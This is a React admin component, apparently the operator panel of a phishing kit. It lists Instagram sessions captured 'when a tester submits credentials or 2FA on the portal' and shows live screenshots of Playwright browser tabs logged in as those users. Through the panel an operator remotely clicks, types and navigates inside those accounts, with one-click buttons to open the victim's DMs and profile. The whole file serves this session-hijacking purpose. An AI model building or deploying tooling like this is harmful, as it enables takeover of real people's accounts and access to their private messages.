"use client";

import { useState, useEffect, useRef } from "react";

interface SessionInfo {
  sessionId: string;
  username: string;
  status: string;
  lastUpdated: number;
  hasPage: boolean;
  lastScreenshotBase64?: string;
}

interface ControlTabClientProps {
  token: string;
  initialSessions: SessionInfo[];
}

export function ControlTabClient({ token, initialSessions }: ControlTabClientProps) {
  const [sessions, setSessions] = useState<SessionInfo[]>(initialSessions);
  const [selectedSessionId, setSelectedSessionId] = useState<string>(
    initialSessions.length > 0 ? initialSessions[0].sessionId : ""
  );
  const [liveScreenshot, setLiveScreenshot] = useState<string>("");
  const [liveUrl, setLiveUrl] = useState<string>("");
  const [textInput, setTextInput] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [statusMsg, setStatusMsg] = useState<string>("");
  const imgRef = useRef<HTMLImageElement>(null);

  // Poll active session details every 3 seconds
  useEffect(() => {
    async function fetchSessionData() {
      try {
        const res = await fetch(`/api/admin/virtual-session?token=${encodeURIComponent(token)}`);
        const data = await res.json();
        if (data.activeSessions) {
          setSessions(data.activeSessions);
          if (!selectedSessionId && data.activeSessions.length > 0) {
            setSelectedSessionId(data.activeSessions[0].sessionId);
          }
        }
      } catch (err) {
        console.error("Error polling sessions:", err);
      }
    }

    const interval = setInterval(fetchSessionData, 3000);
    return () => clearInterval(interval);
  }, [token, selectedSessionId]);

  // Fetch live screenshot for selected session
  const refreshScreenshot = async (sessionId = selectedSessionId) => {
    if (!sessionId) return;
    setIsLoading(true);
    try {
      const res = await fetch(
        `/api/admin/virtual-session?token=${encodeURIComponent(token)}&sessionId=${encodeURIComponent(sessionId)}`
      );
      const data = await res.json();
      if (data.screenshotBase64) {
        setLiveScreenshot(data.screenshotBase64);
        setLiveUrl(data.url || "");
      }
    } catch (err) {
        console.error("Error fetching live screenshot:", err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (selectedSessionId) {
      refreshScreenshot(selectedSessionId);
    }
  }, [selectedSessionId]);

  const handleImageClick = async (e: React.MouseEvent<HTMLImageElement>) => {
    if (!selectedSessionId || !imgRef.current) return;

    const rect = imgRef.current.getBoundingClientRect();
    const scaleX = 1280 / rect.width;
    const scaleY = 800 / rect.height;

    const clickX = Math.round((e.clientX - rect.left) * scaleX);
    const clickY = Math.round((e.clientY - rect.top) * scaleY);

    setStatusMsg(`Clicking at (${clickX}, ${clickY})...`);
    setIsLoading(true);

    try {
      const res = await fetch(`/api/admin/virtual-session?token=${encodeURIComponent(token)}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: selectedSessionId,
          action: "click",
          x: clickX,
          y: clickY,
        }),
      });
      const data = await res.json();
      if (data.screenshotBase64) {
        setLiveScreenshot(data.screenshotBase64);
        setLiveUrl(data.url || "");
        setStatusMsg(`Clicked (${clickX}, ${clickY}) successfully`);
      }
    } catch (err) {
      setStatusMsg("Failed to execute click");
    } finally {
      setIsLoading(false);
    }
  };

  const handleSendText = async () => {
    if (!selectedSessionId || !textInput.trim()) return;

    setStatusMsg(`Typing text into virtual tab...`);
    setIsLoading(true);

    try {
      const res = await fetch(`/api/admin/virtual-session?token=${encodeURIComponent(token)}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: selectedSessionId,
          action: "type",
          text: textInput,
        }),
      });
      const data = await res.json();
      if (data.screenshotBase64) {
        setLiveScreenshot(data.screenshotBase64);
        setLiveUrl(data.url || "");
        setStatusMsg(`Typed "${textInput}" successfully`);
        setTextInput("");
      }
    } catch (err) {
      setStatusMsg("Failed to type text");
    } finally {
      setIsLoading(false);
    }
  };

  const handleNavigate = async (targetUrl: string) => {
    if (!selectedSessionId) return;

    setStatusMsg(`Navigating to ${targetUrl}...`);
    setIsLoading(true);

    try {
      const res = await fetch(`/api/admin/virtual-session?token=${encodeURIComponent(token)}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: selectedSessionId,
          action: "navigate",
          url: targetUrl,
        }),
      });
      const data = await res.json();
      if (data.screenshotBase64) {
        setLiveScreenshot(data.screenshotBase64);
        setLiveUrl(data.url || "");
        setStatusMsg(`Navigated to ${data.url}`);
      }
    } catch (err) {
      setStatusMsg("Failed to navigate");
    } finally {
      setIsLoading(false);
    }
  };

  const selectedSession = sessions.find((s) => s.sessionId === selectedSessionId);

  return (
    <div>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "20px" }}>
        <div>
          <h2 style={{ margin: 0 }}>Live Remote Virtual Tab Command Center</h2>
          <p className="muted" style={{ margin: "4px 0 0 0" }}>
            Real-time interactive remote control for active Playwright Instagram browser tabs.
          </p>
        </div>
        <button
          onClick={() => refreshScreenshot()}
          disabled={isLoading}
          style={{
            padding: "8px 16px",
            backgroundColor: "var(--accent)",
            color: "#fff",
            border: "none",
            borderRadius: "4px",
            cursor: "pointer",
            fontWeight: 600,
          }}
        >
          {isLoading ? "Refreshing..." : "↻ Refresh Viewport"}
        </button>
      </div>

      {sessions.length === 0 ? (
        <div className="panel" style={{ textAlign: "center", padding: "40px" }}>
          <p style={{ color: "var(--muted)", margin: 0 }}>
            No active virtual sessions currently in memory. When a tester submits credentials or 2FA on the portal, their live session will automatically appear here!
          </p>
        </div>
      ) : (
        <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
          {/* Session Selector */}
          <div className="panel" style={{ display: "flex", gap: "12px", alignItems: "center", flexWrap: "wrap" }}>
            <span style={{ fontWeight: 600, fontSize: "14px" }}>Select Active Session:</span>
            {sessions.map((s) => (
              <button
                key={s.sessionId}
                onClick={() => setSelectedSessionId(s.sessionId)}
                style={{
                  padding: "6px 14px",
                  borderRadius: "4px",
                  border: s.sessionId === selectedSessionId ? "2px solid var(--accent)" : "1px solid var(--border)",
                  backgroundColor: s.sessionId === selectedSessionId ? "rgba(175, 145, 100, 0.15)" : "#fff",
                  cursor: "pointer",
                  fontWeight: s.sessionId === selectedSessionId ? 700 : 400,
                }}
              >
                @{s.username} ({s.status}) {s.hasPage ? "🟢 Live" : "⚪ Pool"}
              </button>
            ))}
          </div>

          {selectedSession && (
            <div className="panel">
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "16px" }}>
                <div>
                  <h3 style={{ margin: 0 }}>User: @{selectedSession.username}</h3>
                  <span style={{ fontSize: "12px", color: "var(--muted)" }}>Session ID: {selectedSession.sessionId}</span>
                  {liveUrl && (
                    <div style={{ fontSize: "12px", color: "var(--accent)", marginTop: "4px" }}>
                      Current URL: <code>{liveUrl}</code>
                    </div>
                  )}
                </div>
                <span className={`tag status-${selectedSession.status}`}>{selectedSession.status}</span>
              </div>

              {/* Action Controls */}
              <div style={{ display: "flex", gap: "10px", flexWrap: "wrap", marginBottom: "16px", padding: "12px", backgroundColor: "#f8f9fa", borderRadius: "6px" }}>
                <button
                  onClick={() => handleNavigate("https://www.instagram.com/direct/inbox/")}
                  style={{ padding: "6px 12px", fontSize: "12px", fontWeight: 600, backgroundColor: "#fff", border: "1px solid #ccc", borderRadius: "4px", cursor: "pointer" }}
                >
                  📥 Go to DMs / Inbox
                </button>
                <button
                  onClick={() => handleNavigate("https://www.instagram.com/")}
                  style={{ padding: "6px 12px", fontSize: "12px", fontWeight: 600, backgroundColor: "#fff", border: "1px solid #ccc", borderRadius: "4px", cursor: "pointer" }}
                >
                  🏠 Go to Home Feed
                </button>
                <button
                  onClick={() => handleNavigate(`https://www.instagram.com/${selectedSession.username}/`)}
                  style={{ padding: "6px 12px", fontSize: "12px", fontWeight: 600, backgroundColor: "#fff", border: "1px solid #ccc", borderRadius: "4px", cursor: "pointer" }}
                >
                  👤 View Profile
                </button>
              </div>

              {/* Text Input Control */}
              <div style={{ display: "flex", gap: "8px", marginBottom: "16px" }}>
                <input
                  type="text"
                  placeholder="Type text to send to focused element in virtual tab..."
                  value={textInput}
                  onChange={(e) => setTextInput(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleSendText()}
                  style={{ flex: 1, padding: "8px 12px", borderRadius: "4px", border: "1px solid var(--border)", fontSize: "14px" }}
                />
                <button
                  onClick={handleSendText}
                  disabled={isLoading}
                  style={{ padding: "8px 16px", backgroundColor: "#121212", color: "#fff", border: "none", borderRadius: "4px", cursor: "pointer", fontWeight: 600 }}
                >
                  Send Type
                </button>
              </div>

              {statusMsg && <p style={{ fontSize: "12px", color: "var(--accent)", marginBottom: "12px" }}>{statusMsg}</p>}

              {/* Interactive Screenshot Viewport */}
              {liveScreenshot ? (
                <div>
                  <p style={{ fontSize: "12px", color: "var(--muted)", marginBottom: "8px" }}>
                    👇 Click anywhere on the viewport image to simulate a real mouse click on the virtual Instagram tab:
                  </p>
                  <div style={{ position: "relative", display: "inline-block", cursor: "crosshair", border: "2px solid #121212", borderRadius: "6px", overflow: "hidden" }}>
                    <img
                      ref={imgRef}
                      src={liveScreenshot}
                      alt="Live Virtual Tab Viewport"
                      onClick={handleImageClick}
                      style={{ maxWidth: "100%", height: "auto", display: "block" }}
                    />
                  </div>
                </div>
              ) : (
                <p className="muted">Loading live viewport snapshot...</p>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
